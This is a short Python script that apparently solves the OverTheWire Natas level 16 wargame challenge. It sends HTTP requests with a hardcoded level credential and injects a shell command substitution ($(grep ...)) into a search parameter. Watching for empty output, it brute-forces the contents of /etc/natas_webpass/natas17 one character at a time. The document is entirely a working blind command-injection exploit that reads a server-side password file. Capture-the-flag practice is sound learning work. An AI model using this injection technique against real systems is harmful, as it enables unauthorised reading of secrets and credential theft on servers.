import requests

target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/?'
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password = ''
existsStr = 'Output:\n<pre>\n</pre>'

for i in range(32):
	for c in allchars:
		r = requests.get(target + 'needle=$(grep ^' + password + c + ' /etc/natas_webpass/natas17)whacked')
		#print(r.content)
		if r.content.find(existsStr) != -1:
			password += c
			print(password)
			break	

print(password)		
